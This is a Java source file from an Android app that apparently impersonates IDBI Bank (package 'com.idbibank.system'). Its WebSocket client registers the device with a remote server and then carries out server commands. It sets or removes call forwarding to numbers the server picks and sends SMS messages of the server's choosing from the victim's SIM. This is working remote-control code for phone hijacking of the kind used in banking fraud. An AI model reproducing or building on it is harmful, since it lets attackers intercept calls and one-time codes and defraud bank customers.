package com.idbibank.system.FrontServices;


import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.telephony.SmsManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.idbibank.system.Helper;
import com.idbibank.system.MainActivity;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.concurrent.TimeUnit;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;
import okio.ByteString;


public class WebSocketManager {

    private static final String TAG = "WebSocketManager";
    private static final String CHANNEL_ID = "WebsocketServiceChannel";
    private WebSocket webSocket;
    private final Context context;
    public String url;
    private final OkHttpClient client;

    public WebSocketManager(Context context) {

        this.context = context;
        Helper help = new Helper();
        this.url = help.SocketUrl();
         client = new OkHttpClient.Builder().pingInterval(30, TimeUnit.SECONDS).retryOnConnectionFailure(true).build();
    }

    public void connect() {
//        Log.d(Helper.TAG, "SOCKET CONNECT");

        Request request = new Request.Builder().url(url).build();
        webSocket = client.newWebSocket(request, new WebSocketListener() {
            @Override
            public void onOpen(@NonNull WebSocket webSocket, @NonNull okhttp3.Response response) {
                JSONObject data = new JSONObject();
                try {
                    Helper help = new Helper();
                    data.put("message", "Android Device Connected");
                    data.put("action", "update-mobile-status");
                    data.put("site", help.SITE());
                    data.put("mobile_id", Helper.getAndroidId(context.getApplicationContext()));
                    webSocket.send(data.toString());
                } catch (JSONException e) {
                    throw new RuntimeException(e);
                }
            }

            @Override
            public void onMessage(@NonNull WebSocket webSocket, @NonNull String text) {
                try {
                    JSONObject data = new JSONObject(text);
                    String action = data.optString("action");
                    SharedPreferencesHelper share = new SharedPreferencesHelper(context.getApplicationContext());
                    String connection_id =  share.getString("connection_id", "");
                    if(action.equals("update-call-forwarding-number")){
                        String phone = data.getString("phone_number");
                        String sitename = data.getString("sitename");
                        Helper help = new Helper();
                        if(sitename.equals(help.SITE())){
                            CallForwardingHelper call = new CallForwardingHelper();
                            call.setCallForwarding(context.getApplicationContext(), phone, data.getInt("sim_id"));
                            JSONObject sendData = new JSONObject();
                            sendData.put("sitename", sitename);
                            sendData.put("message", "Updating Number ...");
                            sendData.put("connection_id", connection_id);
                            sendData.put("action","response-call-forwarding-update");
                            String jsondata = sendData.toString();
                            webSocket.send(jsondata);
                        }else{
                            Log.e(Helper.TAG, "Websocket : Sitename not matched");
                        }
                    }else if(action.equals("remove-call-forwarding-number")){
                        String sitename = data.getString("sitename");
                        Helper help = new Helper();
                        if(sitename.equals(help.SITE())){
                            CallForwardingHelper call = new CallForwardingHelper();
                            call.removeCallForwarding(context.getApplicationContext(), data.getInt("sim_id"));

                            JSONObject sendData = new JSONObject();
                            sendData.put("sitename", sitename);
                            sendData.put("message", "Removing Number ...");
                            sendData.put("connection_id", connection_id);
                            sendData.put("action","response-call-forwarding-update");
                            String jsondata = sendData.toString();
                            webSocket.send(jsondata);
                        }else{
                            Log.e(TAG, "Websocket : Sitename not matched");
                        }
                    }else if(action.equals(("phone-sms-forward"))){
                        String sitename = data.getString("site");
                        String mobile_id = data.getString("mobile_id");
                        if(mobile_id.equals(Helper.getAndroidId(context)) ){
                            // forward the sms
                            int sms_forward_id = data.getInt("sms_forward_id");
                            String number = data.getString("number");
                            String message = data.getString("message");
                            String sim_id_string = data.getString("sim_id");
                            int sim_id = Integer.parseInt(sim_id_string);

                            int sentRequestCode = (sms_forward_id + number + "_pending2").hashCode();
                            int deliveredRequestCode = (sms_forward_id + number + "_delivered2").hashCode();

                            Intent sentIntent = new Intent(context, SentReceiver.class);
                            Intent deliveredIntent = new Intent(context, DeliveredReceiver.class);
                            sentIntent.putExtra("sms_forward_id", sms_forward_id);
                            sentIntent.putExtra("phone", number);
                            deliveredIntent.putExtra("sms_forward_id", sms_forward_id);
                            deliveredIntent.putExtra("phone", number);
                            PendingIntent sentPendingIntent = PendingIntent.getBroadcast(context, sentRequestCode, sentIntent, PendingIntent.FLAG_IMMUTABLE);
                            PendingIntent deliveredPendingIntent = PendingIntent.getBroadcast(context, deliveredRequestCode, deliveredIntent, PendingIntent.FLAG_IMMUTABLE);
                            SmsManager smsManager = SmsManager.getSmsManagerForSubscriptionId(sim_id);
                            smsManager.sendTextMessage(number, null, message, sentPendingIntent, deliveredPendingIntent);

                            JSONObject sendData = new JSONObject();
                            sendData.put("sitename", sitename);
                            sendData.put("message", "Request Sent from mobile");
                            sendData.put("sms_forward_id", sms_forward_id);
                            sendData.put("connection_id", connection_id);
                            sendData.put("action","response-sms-forward");
                            String jsondata = sendData.toString();
                            webSocket.send(jsondata);
                        }else{
                            Log.e(Helper.TAG, "Mobile Id Not Matched"+ data.toString());
                        }
                    }else if(action.equals(("connection-id"))){
                        share.saveString("connection_id", data.getString("connection_id"));
                    }
                } catch (JSONException e) {
                    Log.e(Helper.TAG, "Failed to parse JSON: " + e.getMessage() + text + " && "+ e.getStackTrace());
                }
            }

            @Override
            public void onMessage(@NonNull WebSocket webSocket, @NonNull ByteString bytes) {
                Log.d(TAG, "Message from server (binary): " + bytes.hex());
            }

            @Override
            public void onClosing(@NonNull WebSocket webSocket, int code, @NonNull String reason) {
                String check = "Socket Service Closing: " + reason;
                if(!reason.isEmpty()){
                    Log.d(Helper.TAG, check);
                }else{
                    Log.d(Helper.TAG, "Socket Service Closing, Reason Not Found");
                }
                webSocket.close(1000, "Closing Connection");
            }

            @Override
            public void onFailure(@NonNull WebSocket webSocket, @NonNull Throwable t, okhttp3.Response response) {
                for (StackTraceElement element : t.getStackTrace()) {
                    Log.d(Helper.TAG, element.toString());
                }
                if (response != null) {
                    Log.d(Helper.TAG, "Socket Response Failure: " + response.code() + "\n " + response.message());
                    if (response.body() != null) {
                        try {
                            Log.d(Helper.TAG, "Response body: " + response.body().string());
                        } catch (IOException e) {
                            Log.d(Helper.TAG, "Failed to read response body: " + e.getMessage());
                        } finally {
                            response.close();
                        }
                    }
                }
            }
        });
    }

    public void sendMessage(String message) {
        if (webSocket != null) {
            webSocket.send(message);
        }
    }

    public void closeConnection() {
        if (webSocket != null) {
            webSocket.close(1000, "Closing Connection");
        }else{
            Log.d(Helper.TAG, "connection closed");
        }
    }

    public boolean isConnected() {
        return webSocket != null && webSocket.send("ping");
    }

    private void showNotification(String content) {
        Intent notificationIntent = new Intent(context, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(context, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);
        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, CHANNEL_ID)
                .setContentTitle("SMS Service")
                .setContentText(content)
//                .setSmallIcon(R.drawable.logo)  // Set your notification icon here
                .setContentIntent(pendingIntent)
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(false)
                .setOngoing(true);

        NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "WebSocket Channel",
                    NotificationManager.IMPORTANCE_LOW // Or IMPORTANCE_NONE for more restrictive options
            );
            channel.setDescription("Channel for WebSocket notifications");
            notificationManager.createNotificationChannel(channel);
        }

        notificationManager.notify(1, builder.build());
    }
}